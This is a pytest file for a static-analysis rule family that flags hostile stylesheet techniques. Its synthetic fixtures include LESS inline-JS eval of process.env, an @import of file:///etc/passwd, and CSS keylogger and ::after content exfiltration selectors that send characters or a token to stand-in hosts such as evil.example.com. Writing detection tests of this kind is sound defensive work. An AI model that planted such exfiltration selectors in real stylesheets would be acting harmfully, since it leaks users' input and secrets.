"""Fire / silent / FP-guard tests for the S19 stylesheet-TTP rule family.

Inputs are SYNTHETIC — they reproduce the *shapes* of the `nextsecurity` /
`trailofbits/vsix-zoo` CSS/LESS corpus (LESS inline-JS eval, non-standard-scheme
resource loads, CSS-keylogger / content-exfil selectors) using only RFC 2606
placeholder hosts (``*.example.com``/``*.example.org``). No real sample, no live
C2, no working payload enters the repo (see the detection-design README safety
section). The corpus' own ``*.example`` IOCs are themselves synthetic — these
fixtures stay faithful to that and never invent a routable host.
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s19_stylesheet_threats import (
    StylesheetCssExfilRule,
    StylesheetInlineJsRule,
    StylesheetNonstandardSchemeRule,
)

MakeContext = Callable[..., StaticAnalysisContext]


# ── S19a — LESS inline-JavaScript eval (CRITICAL) ─────────────────────────────


def test_inline_js_fires_critical_on_tilde_backtick(make_context: MakeContext) -> None:
    # The canonical LESS inline-JS form: tilde-escaped backtick eval in a .less.
    src = ".x { width: ~`process.env.HOME`; }\n"
    ctx = make_context(files={"theme.less": src})
    findings = StylesheetInlineJsRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s19.stylesheet_inline_js"
    assert finding.severity.value == "critical"
    assert finding.confidence.value == "high"
    assert finding.adversary_class is None
    assert "attack.T1059" in finding.categories
    assert "extrace.ext.stylesheet_inline_js" in finding.categories
    assert finding.evidence


def test_inline_js_fires_on_bare_backtick_in_css(make_context: MakeContext) -> None:
    # Even without the ~ escape, a backtick pair in a stylesheet is LESS inline JS
    # (CSS has no backtick token). A .css file saved as LESS still fires.
    src = "body { color: `globalThis.foo()`; }"
    ctx = make_context(files={"styles.css": src})
    assert len(StylesheetInlineJsRule().evaluate(ctx)) == 1


def test_inline_js_silent_for_backtick_in_javascript(make_context: MakeContext) -> None:
    # The load-bearing scoping guard: a backtick in a .js file is a template
    # literal — routine, never the inline-JS signal. The rule is stylesheet-scoped
    # so it MUST stay silent here (otherwise it would flag every template literal).
    src = "const html = `<div>${title}</div>`;"
    ctx = make_context(files={"extension.js": src})
    assert StylesheetInlineJsRule().evaluate(ctx) == []


def test_inline_js_silent_for_clean_stylesheet(make_context: MakeContext) -> None:
    src = (
        ".btn { color: #fff; background: url('./icon.png'); }\n@media(min-width:1px){}"
    )
    ctx = make_context(files={"theme.less": src})
    assert StylesheetInlineJsRule().evaluate(ctx) == []


# ── S19b — non-standard-scheme resource load (MEDIUM) ─────────────────────────


def test_scheme_fires_on_ftp_import(make_context: MakeContext) -> None:
    # TTP #1 — FTP @import (dead in Chromium, signature/intent value).
    src = '@import url("ftp://malicious.example.com/evil.css");'
    ctx = make_context(files={"a.less": src})
    findings = StylesheetNonstandardSchemeRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].rule_id == "extrace.s19.stylesheet_nonstandard_scheme"
    assert findings[0].severity.value == "medium"
    assert "extrace.ext.stylesheet_nonstandard_scheme" in findings[0].categories


def test_scheme_fires_on_file_local_read(make_context: MakeContext) -> None:
    # TTP #6 — file:// import: a local-file-read attempt (conditional on
    # localResourceRoots), the live half of the non-standard-scheme set.
    src = "@import 'file:///etc/passwd';"
    ctx = make_context(files={"b.less": src})
    assert len(StylesheetNonstandardSchemeRule().evaluate(ctx)) == 1


def test_scheme_fires_on_websocket_import(make_context: MakeContext) -> None:
    # TTP #3 — WebSocket @import (dead anomaly).
    src = "@import url(ws://attacker-c2.example.org/hook.css);"
    ctx = make_context(files={"c.less": src})
    assert len(StylesheetNonstandardSchemeRule().evaluate(ctx)) == 1


def test_scheme_silent_for_https_and_relative(make_context: MakeContext) -> None:
    # FP guard: legitimate stylesheets reference relative + https resources. A CDN
    # font / background is NOT a non-standard scheme and must stay silent here
    # (remote-host scrutiny is the s4/s5 layer's job, gradable by CSP).
    src = (
        "@import url('https://fonts.googleapis.com/css?family=Inter');\n"
        ".hero { background-image: url('./assets/bg.png'); }\n"
        "@font-face { src: url('https://cdn.example.com/font.woff2'); }\n"
    )
    ctx = make_context(files={"d.less": src})
    assert StylesheetNonstandardSchemeRule().evaluate(ctx) == []


# ── S19c — CSS-native exfiltration (MEDIUM) ───────────────────────────────────


def test_exfil_fires_on_attribute_keylogger(make_context: MakeContext) -> None:
    # TTP #11 — CSS keylogger: a substring attribute selector on a value-bearing
    # attribute whose block fires a remote url() GET (leaks the value char-by-char).
    src = (
        'input[value^="a"] {\n'
        "  background: url('https://evil.example.com/exfil?char=a');\n"
        "}\n"
    )
    ctx = make_context(files={"k.less": src})
    findings = StylesheetCssExfilRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].rule_id == "extrace.s19.stylesheet_css_exfil"
    assert findings[0].severity.value == "medium"
    assert "attack.T1056" in findings[0].categories
    assert "extrace.ext.stylesheet_css_exfil" in findings[0].categories


def test_exfil_fires_on_content_pseudo_element(make_context: MakeContext) -> None:
    # TTP #16 — ::after content exfil: a render-time GET carrying a token.
    src = (
        ".secret::after {\n"
        "  content: url('https://attacker.example.com/exfil?secret=USER_TOKEN');\n"
        "}\n"
    )
    ctx = make_context(files={"c2.less": src})
    assert len(StylesheetCssExfilRule().evaluate(ctx)) == 1


def test_exfil_fires_on_protocol_relative_url(make_context: MakeContext) -> None:
    # Protocol-relative //host is remote (two slashes); the keylogger shape with it.
    src = 'label[title*="x"] { background-image: url(//evil.example.org/t.gif); }'
    ctx = make_context(files={"pr.less": src})
    assert len(StylesheetCssExfilRule().evaluate(ctx)) == 1


def test_exfil_silent_for_external_link_icon(make_context: MakeContext) -> None:
    # The load-bearing FP guard: the legitimate external-link-icon pattern uses a
    # prefix selector on href/src + a remote icon. That URL/structural-attribute
    # selector is excluded, so this common, benign pattern stays silent.
    src = 'a[href^="https://"] { background: url("https://cdn.example.com/ext.svg"); }'
    ctx = make_context(files={"link.less": src})
    assert StylesheetCssExfilRule().evaluate(ctx) == []


def test_exfil_silent_for_exact_match_selector_local_icon(
    make_context: MakeContext,
) -> None:
    # Exact-match attribute selectors ([type="text"]) are not the keylogger
    # primitive; a local content icon is not a remote beacon. Both stay silent.
    src = (
        'input[type="checkbox"] { margin: 0; }\n'
        '.tick::before { content: url("./icons/check.svg"); }\n'
    )
    ctx = make_context(files={"form.less": src})
    assert StylesheetCssExfilRule().evaluate(ctx) == []


def test_all_three_silent_for_non_stylesheet_file(make_context: MakeContext) -> None:
    # Scoping invariant: even content that would match is ignored in a non-
    # stylesheet document (the patterns are stylesheet-suffix-scoped).
    src = (
        "const x = ~`process`;\n"
        "// @import url(ftp://malicious.example.com/x.css)\n"
        'input[value^="a"] { background: url("https://evil.example.com/x"); }\n'
    )
    ctx = make_context(files={"extension.ts": src})
    assert StylesheetInlineJsRule().evaluate(ctx) == []
    assert StylesheetNonstandardSchemeRule().evaluate(ctx) == []
    assert StylesheetCssExfilRule().evaluate(ctx) == []
